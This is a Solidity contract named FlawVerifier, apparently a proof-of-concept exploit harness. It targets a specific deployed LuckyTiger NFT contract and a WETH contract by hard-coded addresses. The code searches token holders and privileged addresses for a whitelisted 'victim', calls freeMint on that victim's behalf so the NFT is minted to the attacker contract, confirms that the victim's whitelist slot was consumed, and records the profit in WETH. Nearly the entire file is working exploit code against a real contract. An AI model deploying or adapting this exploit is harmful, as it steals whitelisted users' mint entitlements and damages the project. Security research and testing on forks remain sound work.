// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILuckyTiger {
    function owner() external view returns (address);
    function withdrawAddress() external view returns (address);
    function pauseMint() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function maxTotal() external view returns (uint256);
    function price() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function isWhiteList(address user) external view returns (bool);
    function freeMint(address user) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address user) external view returns (uint256);
}

contract FlawVerifier is IERC721Receiver {
    error MintNotAssignedToAttacker(uint256 tokenId);
    error WhitelistNotConsumed(address victim);

    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public discoveredVictim;
    uint256 public mintedTokenId;
    uint256 private realizedProfit;
    bool public hypothesisValidated;

    constructor() {}

    function executeOnOpportunity() external {
        if (TARGET.pauseMint()) {
            return;
        }

        uint256 supplyBefore = TARGET.totalSupply();
        if (supplyBefore >= TARGET.maxTotal()) {
            return;
        }

        uint256 wethBefore = WETH.balanceOf(address(this));
        uint256 expectedTokenId = supplyBefore + 1;
        address victim = _findSpendableVictim(supplyBefore);
        if (victim == address(0)) {
            return;
        }

        discoveredVictim = victim;

        // exploit_paths[1]: attacker-controlled address A calls freeMint(V).
        TARGET.freeMint(victim);

        // exploit_paths[2]: the contract checks whiteLists[V], but mints to msg.sender.
        if (TARGET.ownerOf(expectedTokenId) != address(this)) {
            revert MintNotAssignedToAttacker(expectedTokenId);
        }

        // exploit_paths[3]: V's whitelist slot is consumed even though V never called.
        if (TARGET.isWhiteList(victim)) {
            revert WhitelistNotConsumed(victim);
        }

        mintedTokenId = expectedTokenId;
        hypothesisValidated = true;

        _wrapAllEth();
        uint256 wethAfter = WETH.balanceOf(address(this));
        realizedProfit = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    function _findSpendableVictim(uint256 supplyBefore) internal view returns (address) {
        address[4] memory obviousCandidates = [TARGET.owner(), TARGET.withdrawAddress(), address(TARGET), address(this)];

        for (uint256 i = 0; i < obviousCandidates.length; i++) {
            if (_isSpendableWhitelistVictim(obviousCandidates[i])) {
                return obviousCandidates[i];
            }
        }

        address[] memory seenHolders = new address[](supplyBefore);
        uint256 seenCount;

        for (uint256 tokenId = 1; tokenId <= supplyBefore; tokenId++) {
            address holder;
            try TARGET.ownerOf(tokenId) returns (address owner_) {
                holder = owner_;
            } catch {
                continue;
            }

            if (holder == address(0) || _seen(seenHolders, seenCount, holder)) {
                continue;
            }

            seenHolders[seenCount] = holder;
            seenCount++;

            if (_isSpendableWhitelistVictim(holder)) {
                return holder;
            }
        }

        return address(0);
    }

    function _isSpendableWhitelistVictim(address candidate) internal view returns (bool) {
        if (candidate == address(0)) {
            return false;
        }

        // exploit_paths[0]: the fork must already contain some victim V that the owner
        // previously whitelisted. We only use publicly discoverable candidate addresses;
        // no storage writes, impersonation, or off-chain whitelist knowledge is introduced.
        return TARGET.isWhiteList(candidate);
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _seen(address[] memory values, uint256 count, address value) internal pure returns (bool) {
        for (uint256 i = 0; i < count; i++) {
            if (values[i] == value) {
                return true;
            }
        }
        return false;
    }
}
